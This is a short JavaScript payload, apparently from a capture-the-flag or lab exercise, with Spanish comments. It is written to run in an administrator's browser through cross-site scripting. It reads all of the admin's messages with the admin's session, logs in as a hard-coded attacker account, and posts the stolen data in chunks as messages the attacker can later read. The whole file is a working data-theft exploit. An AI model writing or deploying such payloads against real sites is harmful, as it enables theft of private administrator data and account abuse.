// navaja_dump.js — ejecutado en el navegador del admin
(async () => {
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  try {
    // 1) leer todos los mensajes del usuario en sesión (admin)
    const r = await fetch('/messages', { credentials: 'include' });
    const j = await r.json();
    const dump = JSON.stringify(j);

    // 2) pivotar a tu usuario y publicar el volcado por trozos
    const YOUR_USER = 'insider1';
    const YOUR_PASS = 'insideer';
    await fetch('/auth', {
      method: 'POST',
      headers: {'Content-Type':'application/x-www-form-urlencoded'},
      body: 'action=login&username=' + encodeURIComponent(YOUR_USER) +
            '&password=' + encodeURIComponent(YOUR_PASS)
    });
    await sleep(300);

    const CHUNK = 800;
    for (let i = 0, part = 0; i < dump.length; i += CHUNK, part++) {
      await fetch('/create_msg', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ message: `ADM_DUMP_${part}: ${dump.slice(i, i + CHUNK)}` })
      });
      await sleep(50);
    }
  } catch (e) {
    try {
      await fetch('/create_msg', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ message: `ADM_DUMP_ERR: ${String(e)}` })
      });
    } catch {}
  }
})();
